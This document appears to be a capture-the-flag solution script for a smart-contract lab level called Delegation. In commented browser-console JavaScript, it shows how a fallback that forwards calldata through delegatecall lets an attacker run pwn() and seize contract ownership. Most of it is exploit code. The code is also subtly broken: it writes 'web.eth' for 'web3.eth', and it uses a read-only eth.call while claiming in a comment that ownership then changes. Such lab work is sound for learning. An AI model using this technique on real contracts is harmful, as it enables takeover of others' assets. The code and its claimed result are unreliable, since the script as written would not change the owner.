await contract.owner();
// >> returns some owner address

// From https://docs.soliditylang.org/en/v0.4.21/introduction-to-smart-contracts.html
// "There exists a special variant of a message call, named delegatecall which
//  is identical to a message call apart from the fact that the code at the
//  target address is executed in the context of the calling contract and
//  msg.sender and msg.value do not change their values."

// This memans that if we can force a call of Delegate.pwn() from the
//  Delegation contract, we can take ownership of it

// From https://docs.soliditylang.org/en/v0.8.12/contracts.html#fallback-function
// "The fallback function is executed on a call to the contract if none of the
//  other functions match the given function signature, or if no data was
//  supplied at all"

// So, if we can make a call to Delegation with the data to make a call to
//  pwn(), then we can force a call to the fallback function, which will pass
//  our msg.data to Delegate, and force a call to the pwn() method within the
//  scope of the Delegation contract, thereby giving us ownership of it

// encode data for calling pwn()
let payload = web.eth.abi.encodeFunctionSignature({
    name: "pwn",
    type: "function",
    inputs: [],
});

// call Delegation contract with our payload
await web3.eth.call({ from: player, to: instance, data: payload });

await contract.owner();
// >> returns our address

// submit
